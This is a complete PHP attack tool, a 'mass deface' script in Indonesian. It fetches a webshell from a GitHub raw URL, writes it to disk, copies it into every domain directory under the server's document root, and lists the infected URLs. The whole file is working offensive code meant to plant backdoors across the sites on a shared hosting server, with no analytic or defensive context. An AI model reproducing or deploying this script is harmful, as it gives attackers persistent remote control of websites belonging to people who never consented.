<?php
################################
##  Script Mass Deface 1dir	  ##
##							  ##
##			Coded by          ##
##		Monkey B Luffy		  ##
## 	Copyright 2017 Bc0de.NET  ##
################################

if (isset($_POST['gogo'])) {
error_reporting(0);
echo "<html><body bgcolor='black'>";

$nama = $_POST['namefile']; // ganti nama filenya
// $sc = $_POST['sc']; // isiin link script mu
$sc = file_get_contents('http://raw.githubusercontent.com/florienzh4x/webshell/master/mini2.php'); // isiin link script mu

$bikin = fopen($nama, "w");
		 fwrite($bikin, $sc);
		 fclose($bikin);
$root = $_POST['pwd'];
$scan = scandir($root);
foreach ( $scan as $a ) {
	$dir = $a;
	$gas = $root.'/'.$a.'/'.$nama;
	$asu = @copy($nama, $gas);
	if($asu) { 	
			echo "<b><font color='lime'>[ DOMAIN ] <a href='http://$dir/$nama' target='_blank'>http://$dir/$nama</a></font></b><br>";
			echo "<font color='lime'>DONE => $gas</font><br>";
	} else  { echo "<font color=red>FAILED => $dir</font><br>"; }
}
echo "</body></html>";	
} else {
	$dirr = $_SERVER['DOCUMENT_ROOT'];
	echo "<html>
	<center>
<body>
	<h1>Mass Deface 1Dir Tools</h1>
	<form method='post' action=''>
		<font>* Jika bukan berada di <i>public_html</i> silahkan hapus folder tambahannya</font><br>
		<input type='text' name='pwd' size='50' value='$dirr'><br><br>
		<input type='text' name='namefile' size='50' placeholder='maqlo.php'><br><br>
		<input type='submit' name='gogo' value='Mass Deface'><br>
	</form>
	</body>
</html>"; 
}
?>
